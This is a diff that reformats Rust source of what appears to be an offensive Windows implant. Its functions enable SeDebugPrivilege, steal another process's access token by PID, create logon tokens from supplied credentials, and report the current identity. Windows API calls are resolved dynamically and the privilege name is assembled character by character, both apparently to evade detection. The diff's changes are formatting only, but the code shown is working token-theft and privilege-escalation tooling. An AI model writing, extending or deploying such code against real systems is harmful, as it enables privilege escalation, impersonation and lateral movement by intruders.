@@ -80,30 +80,28 @@ unsafe fn enable_debug_privilege() -> bool {
     const TOKEN_QUERY: u32 = 0x0008;
 
     type GetCurrentProcess = unsafe extern "system" fn() -> *mut c_void;
-    type OpenProcessToken =
-        unsafe extern "system" fn(*mut c_void, u32, *mut *mut c_void) -> i32;
+    type OpenProcessToken = unsafe extern "system" fn(*mut c_void, u32, *mut *mut c_void) -> i32;
     type LookupPrivilegeValueW =
         unsafe extern "system" fn(*const u16, *const u16, *mut Luid) -> i32;
     type AdjustTokenPrivileges = unsafe extern "system" fn(
-        *mut c_void,      // TokenHandle
-        i32,              // DisableAllPrivileges
+        *mut c_void,            // TokenHandle
+        i32,                    // DisableAllPrivileges
         *const TokenPrivileges, // NewState (NULL ok)
-        u32,              // BufferLength
-        *mut c_void,      // PreviousState (NULL)
-        *mut u32,         // ReturnLength (NULL)
+        u32,                    // BufferLength
+        *mut c_void,            // PreviousState (NULL)
+        *mut u32,               // ReturnLength (NULL)
     ) -> i32;
     type CloseHandle = unsafe extern "system" fn(*mut c_void) -> i32;
 
-    let gcp: GetCurrentProcess =
-        match unsafe { export_addr(b"kernel32.dll", b"GetCurrentProcess") } {
-            Some(a) => unsafe { core::mem::transmute(a) },
-            None => return false,
-        };
-    let opt: OpenProcessToken =
-        match unsafe { export_addr(b"advapi32.dll", b"OpenProcessToken") } {
-            Some(a) => unsafe { core::mem::transmute(a) },
-            None => return false,
-        };
+    let gcp: GetCurrentProcess = match unsafe { export_addr(b"kernel32.dll", b"GetCurrentProcess") }
+    {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return false,
+    };
+    let opt: OpenProcessToken = match unsafe { export_addr(b"advapi32.dll", b"OpenProcessToken") } {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return false,
+    };
     let lpv: LookupPrivilegeValueW =
         match unsafe { export_addr(b"advapi32.dll", b"LookupPrivilegeValueW") } {
             Some(a) => unsafe { core::mem::transmute(a) },
@@ -122,9 +120,21 @@ unsafe fn enable_debug_privilege() -> bool {
     let mut luid = Luid { low: 0, high: 0 };
     // SeDebugPrivilege (UTF-16, null-terminated).
     let priv_name: [u16; 15] = [
-        b'S' as u16, b'e' as u16, b'D' as u16, b'e' as u16, b'b' as u16, b'u' as u16,
-        b'g' as u16, b'P' as u16, b'r' as u16, b'i' as u16, b'v' as u16, b'i' as u16,
-        b'l' as u16, b'e' as u16, 0,
+        b'S' as u16,
+        b'e' as u16,
+        b'D' as u16,
+        b'e' as u16,
+        b'b' as u16,
+        b'u' as u16,
+        b'g' as u16,
+        b'P' as u16,
+        b'r' as u16,
+        b'i' as u16,
+        b'v' as u16,
+        b'i' as u16,
+        b'l' as u16,
+        b'e' as u16,
+        0,
     ];
     if unsafe { lpv(core::ptr::null(), priv_name.as_ptr(), &mut luid) } == 0 {
         return false;
@@ -141,7 +151,16 @@ unsafe fn enable_debug_privilege() -> bool {
     };
     // AdjustTokenPrivileges returns 1 on success even if not all privs were
     // adjusted; GetLastError (we don't call it) distinguishes. Best-effort.
-    let ok = unsafe { atp(htok, 0, &tp, 0, core::ptr::null_mut(), core::ptr::null_mut()) };
+    let ok = unsafe {
+        atp(
+            htok,
+            0,
+            &tp,
+            0,
+            core::ptr::null_mut(),
+            core::ptr::null_mut(),
+        )
+    };
     let _ = close(htok);
     ok != 0
 }
@@ -159,14 +178,13 @@ pub unsafe fn steal_token(pid: u32) -> Result<(), &'static str> {
     let _ = unsafe { enable_debug_privilege() };
 
     type OpenProcess = unsafe extern "system" fn(u32, i32, u32) -> *mut c_void;
-    type OpenProcessToken =
-        unsafe extern "system" fn(*mut c_void, u32, *mut *mut c_void) -> i32;
+    type OpenProcessToken = unsafe extern "system" fn(*mut c_void, u32, *mut *mut c_void) -> i32;
     type DuplicateTokenEx = unsafe extern "system" fn(
-        *mut c_void, // ExistingTokenHandle
-        u32,         // DesiredAccess
-        *const c_void, // TokenAttributes (NULL)
-        u32,         // ImpersonationLevel
-        u32,         // TokenType (1 = TokenImpersonation)
+        *mut c_void,      // ExistingTokenHandle
+        u32,              // DesiredAccess
+        *const c_void,    // TokenAttributes (NULL)
+        u32,              // ImpersonationLevel
+        u32,              // TokenType (1 = TokenImpersonation)
         *mut *mut c_void, // DuplicateTokenHandle
     ) -> i32;
     type CloseHandle = unsafe extern "system" fn(*mut c_void) -> i32;
@@ -287,11 +305,11 @@ pub unsafe fn make_token(
         return Err("make_token: advapi32.dll load failed");
     }
     type LogonUserW = unsafe extern "system" fn(
-        *const u16, // username
-        *const u16, // domain
-        *const u16, // password
-        u32,        // logon type
-        u32,        // logon provider (0 = DEFAULT)
+        *const u16,       // username
+        *const u16,       // domain
+        *const u16,       // password
+        u32,              // logon type
+        u32,              // logon provider (0 = DEFAULT)
         *mut *mut c_void, // phToken
     ) -> i32;
     type CloseHandle = unsafe extern "system" fn(*mut c_void) -> i32;
@@ -394,7 +412,8 @@ pub fn getuid() -> String {
     // → LookupAccountSidW for DOMAIN\user.
     type GetCurrentThread = unsafe extern "system" fn() -> *mut c_void;
     type GetCurrentProcess = unsafe extern "system" fn() -> *mut c_void;
-    type OpenThreadToken = unsafe extern "system" fn(*mut c_void, u32, i32, *mut *mut c_void) -> i32;
+    type OpenThreadToken =
+        unsafe extern "system" fn(*mut c_void, u32, i32, *mut *mut c_void) -> i32;
     type OpenProcessToken = unsafe extern "system" fn(*mut c_void, u32, *mut *mut c_void) -> i32;
     type GetTokenInformation = unsafe extern "system" fn(
         *mut c_void, // TokenHandle
@@ -404,26 +423,25 @@ pub fn getuid() -> String {
         *mut u32,    // ReturnLength
     ) -> i32;
     type LookupAccountSidW = unsafe extern "system" fn(
-        *const u16,             // lpSystemName (NULL)
-        *const c_void,          // Sid
-        *mut u16,               // Name
-        *mut u32,               // cchName
-        *mut u16,               // ReferencedDomainName
-        *mut u32,               // cchDomainName
-        *mut u8,                // peUse
+        *const u16,    // lpSystemName (NULL)
+        *const c_void, // Sid
+        *mut u16,      // Name
+        *mut u32,      // cchName
+        *mut u16,      // ReferencedDomainName
+        *mut u32,      // cchDomainName
+        *mut u8,       // peUse
     ) -> i32;
     type CloseHandle = unsafe extern "system" fn(*mut c_void) -> i32;
 
-    let gct: GetCurrentThread =
-        match unsafe { export_addr(b"kernel32.dll", b"GetCurrentThread") } {
-            Some(a) => unsafe { core::mem::transmute(a) },
-            None => return String::from("getuid: GetCurrentThread unresolved"),
-        };
-    let gcp: GetCurrentProcess =
-        match unsafe { export_addr(b"kernel32.dll", b"GetCurrentProcess") } {
-            Some(a) => unsafe { core::mem::transmute(a) },
-            None => return String::from("getuid: GetCurrentProcess unresolved"),
-        };
+    let gct: GetCurrentThread = match unsafe { export_addr(b"kernel32.dll", b"GetCurrentThread") } {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return String::from("getuid: GetCurrentThread unresolved"),
+    };
+    let gcp: GetCurrentProcess = match unsafe { export_addr(b"kernel32.dll", b"GetCurrentProcess") }
+    {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return String::from("getuid: GetCurrentProcess unresolved"),
+    };
     let ott: OpenThreadToken = match unsafe { export_addr(b"advapi32.dll", b"OpenThreadToken") } {
         Some(a) => unsafe { core::mem::transmute(a) },
         None => return String::from("getuid: OpenThreadToken unresolved"),
@@ -437,7 +455,8 @@ pub fn getuid() -> String {
             Some(a) => unsafe { core::mem::transmute(a) },
             None => return String::from("getuid: GetTokenInformation unresolved"),
         };
-    let las: LookupAccountSidW = match unsafe { export_addr(b"advapi32.dll", b"LookupAccountSidW") } {
+    let las: LookupAccountSidW = match unsafe { export_addr(b"advapi32.dll", b"LookupAccountSidW") }
+    {
         Some(a) => unsafe { core::mem::transmute(a) },
         None => return String::from("getuid: LookupAccountSidW unresolved"),
     };
